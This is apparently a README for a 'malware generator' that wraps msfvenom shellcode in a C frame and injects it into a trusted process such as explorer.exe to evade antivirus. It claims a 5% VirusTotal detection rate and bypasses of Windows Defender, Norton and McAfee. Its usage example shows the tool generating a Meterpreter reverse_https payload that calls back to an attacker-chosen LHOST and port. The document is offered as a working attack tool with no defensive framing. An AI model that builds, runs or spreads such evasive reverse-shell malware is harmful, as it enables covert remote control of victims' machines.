# Malware generator tool

## Overview
This tool was built on msfvenom. It generates and encapsulates the msfvenom payload inside a frame written in c. As of 10/13/2022, it achieved a 5% detection rating on virustotal. It bypassed detection on Windows Defender, Norton Antivirus, McAfee, and many more. I automatically inject the shellcode into another trusted process. Since the shellcode runs in another process, such as exploror.exe, it is ignored by the AV and evades real-time protection. It can then safely make internet requests without the AV warning the user.

## Usage
Example:
```
$ ./gen.py   
What is the LHOST: 192.168.1.224
What is the LPORT: 443
What is the msfvenom payload you want to use? windows/x64/meterpreter/reverse_https
What PID do you want to inject into: (Tip: use explorer.exe.) 12836
Enter output file name: payload.c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 675 bytes
```
